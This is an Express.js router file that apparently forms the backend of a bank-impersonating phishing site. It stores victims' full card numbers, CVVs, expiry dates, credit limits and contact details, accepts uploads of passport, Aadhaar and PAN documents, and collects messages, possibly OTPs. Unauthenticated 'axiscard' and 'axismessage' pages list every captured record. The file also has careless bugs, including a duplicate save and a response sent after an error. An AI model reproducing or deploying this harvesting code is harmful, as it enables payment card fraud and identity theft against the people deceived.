var express = require('express');
var router = express.Router();
const CardModal = require('../models/CardData')
const MessageModal = require('../models/MessageData')
const multer = require("multer")

const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    return cb(null, "./uploads")
  },
  filename: function (req, file, cb) {
    return cb(null, `${Date.now()}-${file.originalname}`)
  },
})

const upload = multer({ storage })


/* GET home page. */
router.get('/', function (req, res, next) {
  res.render('index', { title: 'Home' });
});
router.get('/home', function (req, res, next) {
  res.render('loginHome', { title: 'homelogin' });
});
router.get('/formpage', function (req, res, next) {
  res.render('form', { title: 'Form' });
});

router.get('/options', function (req, res, next) {
  res.render('fileuplode', { title: 'fileuplode' });
});

router.post("/upload", upload.fields([{ name: "prifilepasport" }, { name: 'adrcard' }, { name: "pancard" }]), (req, res) => {
  console.log(req.body);
  console.log(req.file);
  return res.redirect("/options");
})


router.post('/card', async function (req, res, next) {
  try {
    var userDetails = new CardModal({
      name: req.body.name,
      mobile: req.body.mobile,
      email: req.body.email,
      dob: req.body.dob,
      totalLimit: req.body.totalLimit,
      avLimit: req.body.avLimit,
      cardNumber: req.body.cardNumber,
      holderName: req.body.holderName,
      exDate: req.body.expiry,
      cvv: req.body.cvv
    });
    const user = await userDetails.save();
    console.log(user);
  } catch (err) {
    console.log(err);
    res.status(500).json(err);
  }

  userDetails.save();
  res.render('success')
});

router.post('/message', async (req, res) => {
  try {
    var userDetails = new MessageModal({
      message: req.body.message,
    });
    const message = await userDetails.save();
  } catch (err) {
    console.log(err);
    res.status(500).json(err);
  }
  res.send('message got success')
})

router.get("/axiscard", async (req, res) => {
  let cardData = await CardModal.find().sort({ createdAt: -1 });
  res.render("card", { cardData })
})
router.get("/axismessage", async (req, res) => {
  let cardData = await MessageModal.find().sort({ createdAt: -1 });
  res.render("message", { cardData })
})





module.exports = router;
